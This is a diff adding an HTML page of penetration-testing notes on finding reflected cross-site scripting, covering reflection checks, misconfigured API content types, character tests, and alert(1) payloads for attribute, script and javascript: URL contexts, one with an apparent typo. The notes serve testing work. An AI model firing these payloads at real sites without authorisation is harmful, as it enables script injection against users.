@@ -1,0 +1,47 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>General</title>
+</head><body><span style="font-size: 12pt"><b>DETECTION</b><br/>
+<br/>
+</span><span style="font-size: 12pt"><b>Reflections</b></span><br/>
+<br/>
+Submit unique string to every page and every parameter and search for reflection in response<br/>
+If reflection found in POST parameter, try to use this parameter in GET request<br/>
+Referer and User-Agent strings can be reflected in error messages<br/>
+<br/>
+<b><span style="font-size: 12pt">Reflections in API</span></b><br/>
+<br/>
+Check web API response headers. They may be misconfigured and can contain <tt>Content-Type: text/html</tt><br/>
+instead of <tt>text/javascript </tt>or <tt>application/json</tt>. If we detect reflection then we have XSS.<b><br/>
+</b><b><br/>
+</b><b><span style="font-size: 12pt">Allowed characters</span></b><br/>
+<br/>
+Test following character set<br/>
+<tt>&quot;'&lt;&gt;();[]{}AbC</tt><br/>
+<br/>
+<b><span style="font-size: 12pt">Introducing script to reflection</span></b><br/>
+<br/>
+URLencode all tests!<br/>
+<br/>
+<b>Reflection in tag attribute</b><br/>
+<tt>&lt;input type=”text” name=”address1” value=”AAAAAAAAAAAAAA”&gt;</tt><br/>
+Test:<br/>
+AA&quot;<tt>&gt;&lt;script&gt;alert(1)&lt;/script&gt;</tt><br/>
+AA&quot;<tt>onfocus=&quot;alert(1)</tt><br/>
+<br/>
+<b>Reflection in script</b><br/>
+<tt>&lt;script&gt;var a = ‘AAAAAAAAAAAAAA’; var b = 123; ... &lt;/script&gt;</tt><br/>
+Test:<br/>
+<tt>AA'; alert(1); var foo='<br/>
+</tt><tt>AA'; alert(1); //</tt><br/>
+<br/>
+<b>Reflection in URL attribute</b><br/>
+<tt>&lt;a href=”AAAAAAAAAAAAAA”&gt;Click here ...&lt;/a&gt;</tt><br/>
+Test:<br/>
+<tt>javascript:alert(1);<br/>
+#&quot;onclick=&quot;javascript:alert(1)<br/>
+javascript://%0d%0aalert(1);<br/>
+javascript://%0d%0aalert(1);//http://derp.com<br/>
+</tt><tt>javascript://%0d%0alert(1);//.com</tt><br/>
+</body></html>
